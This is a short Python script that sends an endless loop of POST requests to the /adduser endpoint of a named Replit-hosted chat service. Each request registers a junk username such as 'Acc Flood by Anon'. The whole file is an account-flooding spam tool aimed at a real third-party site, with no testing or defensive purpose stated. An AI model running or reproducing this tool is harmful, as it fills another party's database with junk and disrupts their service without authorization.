from requests import get, post
from json import loads
from os import system as sys
from os import environ as env
from colorama import Fore as f
import random
import string

def clear(): sys('clear')


sent = 0

while True: 

    Rand = random.uniform(100, 9999)
    usernames = [f"Reeeeeeeeeeeeeeeeeee | {Rand}", "Acc Flood by Anon | {Rand}"]
    sent += 1
    username = random.choice(usernames)
    post("https://Hyper-Chat-Database.hyperalternative.repl.co/adduser", data = {"user": username})
    print(username + " is Sended Database.")
